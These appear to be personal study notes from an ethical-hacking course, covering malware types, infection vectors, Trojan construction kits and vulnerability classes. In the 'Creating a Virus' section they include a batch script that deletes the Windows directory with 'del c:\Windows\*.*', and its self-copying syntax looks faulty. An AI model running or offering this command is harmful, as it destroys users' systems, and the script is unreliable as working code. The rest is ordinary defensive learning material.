>Date: 2024 09 05
>Author: Denali

## Introduction to Malware
Malware is malicious software that damages or disables computer systems and gives limited or full control of the systems to the malware creator for the purpose of theft or fraud

### Reasons to develop malware
- Attack browsers and track websites visited
- Slow down systems and degrade their performance
- Cause hardware failure, render computers inoperable
- Steal personal information, including contacts
- Erase valuable information
- Attack additional systems
- Spam inboxes with ads

### Ways for malware to enter a system
- Instant Messenger applications
- Portable hardware media/removable devices
- Browser and email software bugs
- Untrusted websites and freeware web applications/software
- Downloading files from the internet
- Insecure patch management
- Rogue/Decoy applications
- Email Attachments
- Network Propagation
- File sharing services
- Install by other malware
- Bluetooth/Wireless networks

### Common techniques attackers use to distribute malware
*Black hat Search Engine Optimizations (SEO)* - Ranking malware pages highly in search results
*Social Engineering Click-Jacking* - Tricking users into clicking on innocent-looking webpages
*Spear-phishing Sites* - Mimicking legitimate institutions in an attempt to steam login credentials
*Malvertising* - Embedding malware in ad-networks that display across hundreds of legitimate, high-traffic sites
*Compromised Legitimate Websites* - Hosting embedded malware that spreads to unsuspected visitors
*Drive-by Downloads* - Exploiting flaws in browser software to install malware just by visiting a page
*Spam Emails* - Attaching the malware to emails and tricking victims to click the attachment

### Components of Malware
*Crypter* - Software that protects malware from undergoing reverse engineering or analysis
*Downloader* - A type of Trojan that downloads other malware from the internet onto the PC
*Dropper* - A type of Trojan that covertly installs other malware files onto the system
*Exploit* - A malicious code that breaches the system security via running software vulnerabilities to access information or install malware
*Injector* - A program that injects its code into other vulnerable running processes and changes how they execute to hide or prevent it's removable
*Obfuscator* - A program that conceals its code and intended purpose via various techniques, and thus making it hard for security mechanisms to detect and remove it
*Packer* - A program that allows all files to bundle together into a single executable file via compression to bypass security software detection
*Payload* - A piece of software that allows control over a computer system after it has been exploited
*Malicious Code* - A command that defines malware's basic functionalities such as stealing data and creating backdoors

### Types of Malware
#### Trojans
Malicious software contained inside an apparently harmless application
Often get activated when a user does specific actions
Create a covert communications channel between the victim computer and attacker for transferring sensitive data
Do not propagate

##### Indications of a Trojan Attack
![](Pasted%20image%2020240905103819.png)

##### How Attackers use Trojans
- Delete or replace critical operating system files
- Generate fake traffic to create a DoS
- Record screenshots, audio, and video of victim’s PC
- Use victim’s PC for spamming and blasting email messages
- Download spyware, adware, and malicious files
- Disable firewalls and antivirus
- Create backdoors to gain remote access
- Use the victims PC as a Proxy for relay attacks
- Steal personal information such as passwords, security codes, and credit card information
- Encrypt the data and lock out the victim from accessing the machine

##### Common ports used by Trojans
![](Pasted%20image%2020240905104011.png)

##### Types of Trojans
*Remote Access (RAT)* - Service Protocol
*Backdoor* - Mobile
*Botnet* - IOT
*Rootkit* - Security software disabler
*E-Banking* - Destructive
*Point of Sale (POS)* - Denial of Service (DoS)
*Defacement* - Command shell

##### Creating a Trojan
1. Trojan Horse Construction kits help attackers to construct Trojan horses of their choice
2. The tools in these kits can be dangerous and can backfire if not properly executed

*Trojan Horse Construction Kits*
- DarkHorse Trojan Virus Maker
- Trojan Horse Construction Kit
- Senna Spy Trojan Generator
- Batch Trojan Generator
- Umbra Loader - Botnet Trojan Maker

#### Viruses
##### What is a Virus?
A self propagating program that produces its own copy by attaching itself to another program, computer boot sector or document
Viruses are generally transmitted through file downloads, infected disk/flash drives and as email attachments

*Characteristics of a Virus*
- Infect other programs
- Transform themselves
- Encrypt themselves
- Alter Data
- Corrupt files and programs
- Self-Replicate

##### Purpose of Creating Viruses
- Inflict damage on competitors
- Realize financial benefits
- Vandalize
- Play pranks
- Cyber-Terrorism
- Political messaging
- Damage networks/computers
- Gain remote access

##### Indications of a Virus Attack
- Process require more resources, worse perfomance
- Computer beeps with no display
- Drive label changes/OS doesn't load
- Constant antivirus alerts
- Computer freezes frequently or encounters an error like BSOD
- Files/folders are missing
- Suspicious hard drive activity
- Loss of storage space
- Unwanted ads
- Unable to open files
- Strange emails

##### Stages of a Virus Lifecycle
![](Pasted%20image%2020240905105128.png)

##### How a computer gets infected with a Virus
- When a user accepts files and downloads without properly checking the source
- Opening infected e-mail attachments
- Not running the latest antivirus application
- Clicking malicious online ads
- Installing pirated software
- Using portable media
- Not updating and not installing new versions of plug-ins
- Connecting to untrusted networks
- Social Media
- Malicious online ads

##### Types of Viruses
- System or Boot sector Virus
- File and Multipartite Virus
- Macro and Cluster Virus
- Stealth/Tunneling
- Encryption
- Sparse Infector
- Polymorphic
- Metamorphic
- Overwriting file/Cavity virus
- Companion/Camouflaged
- Shell and file extension
- FAT and Logic Bomb
- Web Scripting Virus Email
- Armored
- Add-on Intrusive
- Direct action/Transient
- Terminate & Stay resident

##### Creating a Virus
create a batch file that looks like
```bat
@ echo off
for %%f in (*.bat) do
copy %%f + Game.bat
del c:\Windows\*.*
```
When run, it **copies itself** to all the `.bat` files in the current directory and deletes all the files in the windows directory

#### Ransomware
Restricts access to the computer system files and folders
Demands an online ransom payment to the creators to remove the restrictions

##### Process
1. Attacker attaches Ransomware in email
2. Malware executes and gets installed
3. Victim pays ransomware to get access
4. Attacker unlocks and provide access
5. Victim gets access to files

#### Computer Worms
Malicious programs that independently replicate, execute, and spread across the network connections
Consume available computing resources without human interaction
Attackers use worm payloads to install backdoors in infected computers

![](Pasted%20image%2020240905111836.png)

#### Worms vs Viruses
A Worm replicates on it's own
A worm spreads through the infected network
A Virus requires activation, usually by a human
Viruses replicate by creating their own files on an infected system, attaching themselves to a legitimate program, other files or email attachments

#### Rootkits
- Rootkits are programs that hide their presence as well as attacker's malicious activities, granting them full access to the server or host at the time, and in the future
- Rootkits replace certain operating system calls and utilities with their own modified versions of those routines that, in turn, undermine the security of the target system causing malicious functions to be executed
- Compromises backdoor programs, DDoS programs, packet sniffers, log-wiping utilities, IRC bots, etc.

### Potentially Unwanted Applications (PUA)
Also known as grayware or junkware, they may pose sever risks to the security and privacy of data stored in the system where they are installed
Installed when downloading and installing freeware using third-party installer or when accepting a misleading license agreement
Covertly monitor and alter the data or settings in the system, similarly to other malware

#### Types of PUA
- Adware
- Torrent
- Marketing
- Cryptomining
- Dialers

#### Adware
Software or program that supports ads and generates pop-ups
Tracks the cookies and user browser patterns for marketing purposes and collects user data
Consumes additional bandwidth, exhausts CPU and Memory usage

*Indications of Adware*
- Frequent system lag
- Inundated ads
- Incessant system crashes
- Disparity in the default browser homepage
- Presence of new toolbar or browser ad-ons
- Slow internet

#### Spyware
![](Pasted%20image%2020240905113049.png)

![](Pasted%20image%2020240905113155.png)

#### Keyloggers
- programs or hardware that monitors each keystroke as the user types on a keyboard, logs onto a file, or transmits them to a remote location
- It allows the attacker to gather confidential information about the victim such as email ID, password, banking details, chat room messages, etc.
- Can be software or hardware

##### Purpose
![](Pasted%20image%2020240905113505.png)

#### Botnets
Collection of compromised computers connected to the internet to perform a distributed task
Attackers distribute malicious software that turns a user's computer into a bot
Bot refers to a program or an infected system that performs repetitive work or acts as an agent or as a user interface to control other programs

![](Pasted%20image%2020240905113547.png)

##### Advantages of Botnets
- Perform DDoS attacks, which consumes bandwidth of the victims computers
- Use sniffer to steal information from one botnet and use it against another
- Perform keylogging to harvest account login information
- Use to spread new bots
- Perpetrate a "click fraud" by automating clicks
- Mass identity theft

#### Fileless Malware
- Infects legitimate software, applications, other protocols existing in the system to perform malicious activity
- Leverages existing vulnerabilities
- Resides in the system's RAM
- Injects malicious code into running processes such as Word, Flash, Adobe Reader, JavaScript and PowerShell

##### Reasons for using Fileless Malware
- Stealthy - Exploit legitimate system tools
- Living off the land - Exploit default system tools
- Trustworthy - Use tools that are used frequently and trusted

##### Example - Divergent
Divergent is a type of fileless malware that depends mostly only the registry for the execution and storage of configuration data
It also employs a key in the registry to maintain persistence and exploits PowerShell to inject itself on to the other processes

### What is a vulnerability
Existence of a weakness in an asset that can be exploited by threat agents

*Common Reasons behind the existence of vulnerability*
- Hardware/software misconfiguration
- Insecure or poor design of the network application
- Inherent technology weakness
- Careless approach of end users
- Intentional end-user action

#### Examples of Network Security Vulnerabilities
![](Pasted%20image%2020240905114527.png)
Old/unused/test user accounts are vulnerable
System accounts have higher privilege than even admin
Default passwords/settings a lot of people don't change them

![](Pasted%20image%2020240910101047.png)
Unwritten policies are easy to forget or new people don't know about it
People break traffic rules all the time because theres no continuity

#### Areas of vulnerabilities for users
![](Pasted%20image%2020240910101518.png)
![](Pasted%20image%2020240910101652.png)
IOT is horrible for security

#### Impacts caused by vulnerabilities
![](Pasted%20image%2020240910101841.png)

#### Risk
![](Pasted%20image%2020240910101929.png)
Risk doesn't need an active Threat component

#### Consequences of Risk
![](Pasted%20image%2020240910102031.png)

#### Risk Assessment
![](Pasted%20image%2020240910102237.png)

### Vulnerability Classifications
![](Pasted%20image%2020240910102354.png)

#### Misconfigurations/Weak Configurations
Most common
Mostly caused by human error
Break into network and gain unauthorized access

Network Misconfigurations
- Insecure Protocols
- Open ports/services
- Errors
- Weak encryption

Host Misconfigurations
- Open Permissions
- Unsecured root accounts

#### Default Installations
user friendly
A lot of consumer products get left with with the default password

#### Application Flaws
 - Buffer overflows
 - Memory leaks
 - integer overflows
 - Null pointer
 - DLL injection
 - race conditions
 - improper input/error handling

#### Poor patch management
Unpatched software can make an application, server or device vulnerable
- Unpatched servers
- Unpatched software
- Unpatched OS
- Unpatched applications

#### Design flaws
Incorrect encryption or poor validation of data refer to logical flaws and attackers can bypass the detection mechanism

#### Operating System flaws
![](Pasted%20image%2020240910103500.png)

#### Default passwords
![](Pasted%20image%2020240910103515.png)
Aimed at consumers

#### Zero-day Vulnerabilities
![](Pasted%20image%2020240910103547.png)

#### System sprawl/undocumented assets
Adding new systems/expansions without properly designing it or documenting it
Undocumented assets are old computers/things that are forgotten about

#### Improper Certificate key management
Allows the attacker to get your key and break your encryption

#### 3rd party risks
Cloud storage/serverless infrastructure has this issue
- Vendor management
- Data storage
- Supply-chain risks
- Cloud-based vs on-premises risks
